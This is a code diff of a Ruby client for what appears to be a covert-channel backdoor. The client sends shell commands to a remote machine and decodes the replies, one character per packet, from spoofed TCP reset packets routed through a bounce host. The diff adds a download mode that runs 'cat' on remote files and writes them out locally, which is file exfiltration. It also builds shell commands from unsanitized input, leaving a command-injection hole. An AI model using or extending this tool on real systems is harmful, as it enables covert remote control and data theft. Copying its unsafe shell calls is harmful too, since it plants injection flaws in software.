@@ -15,41 +15,65 @@ class Client
   def start
      puts "started"
 
-    Thread.new{ readPackets }
+
     while (true)
+     puts "write a command or prepend 'dl ' to your command to get a file"
       str = STDIN.gets
-      @conn.cliSend(str)
-      puts "sent"
+      if str[0,3] == "dl "
+        @conn.cliSend("cat " + str[3..-1])
+        array = str[3..-1].split("/")
+        fn = array[array.length - 1]
+        system("rm -f #{fn}")
+        puts fn
+        t = Thread.new{ readPackets(fn) }
+      else
+        @conn.cliSend(str)
+        t = Thread.new{ readPackets() }
+      end
+      t.join
+
+      puts "Command Sent"
 
     end
   end
 
 private
 
-  def readPackets
+  def readPackets(dl = nil)
     while(true)
       case @tos
         when "icmp"
-          icmp
+          icmp(dl)
         when "tcp"
-          tcp
+          tcp(dl)
         when "udp"
-          udp
+          udp(dl)
         else
           abort("Client::readPackets @tos not initialized")
       end
     end
   end
 
-  def tcp
-  puts "got to tcp receive"
-    #filter = "tcp and " + @port.to_s + " and src " + @daddr
-    filter = "tcp and tcp[13] & 32!=0 and tcp[13] & 8!=0 and tcp[13] & 4!=0 and src port 1-7999 and dst #{$tcpBounceIp}"
-    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
+  def tcp(dl = nil)
+  puts "using tcp to receive"
+    filter = "tcp and tcp[13] & 4!=0 and src #{$tcpBounceIp}"
+    cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
     cap.stream.each do |p|
-      puts "got packet"
       pkt = Packet.parse p
-      puts tcpRecv(pkt)
+      if pkt.is_tcp?
+        puts "packet Recieved"
+        if (pkt.tcp_dst == 2560)
+          puts "final packet"
+          STDOUT.flush
+          return
+        end
+        char = (pkt.tcp_dst >> 8).chr
+        if (dl.nil?)
+          print char
+        else
+          system("echo -ne #{char} >> #{dl}")
+        end
+      end
     end
   end
 
